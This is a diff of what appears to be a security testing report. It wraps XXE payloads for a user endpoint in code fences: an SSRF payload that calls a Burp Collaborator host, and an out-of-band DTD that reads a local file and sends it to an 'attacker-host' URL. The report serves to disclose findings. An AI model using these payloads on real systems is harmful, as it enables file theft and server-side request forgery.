@@ -27,21 +27,27 @@
 - Params: object User in body request
 - Payload: 
 + SSRF 
+```
   <!DOCTYPE stockCheck [ <!ENTITY xxe SYSTEM "http://kayrz7fdlsb6w9gif751ob26rxxtli.burpcollaborator.net"> ]>
     <user>
       <id_user>&xxe;</id_user>
     </user>
+  ```
 + OOB
 --- DTD file ---
+```
 <!ENTITY % file SYSTEM "file:///d:/cache.txt">
         <!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://attacker-host/%file;'>">
         %eval;
         %exfiltrate;
+```
 -- payload --
+```
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM
 "https://DTD-url"> %xxe;]>
 <user>
 <id_user>1</id_user></user>
+```
 
 ### 3. POST "/product/buy"
 - Bug: Logic
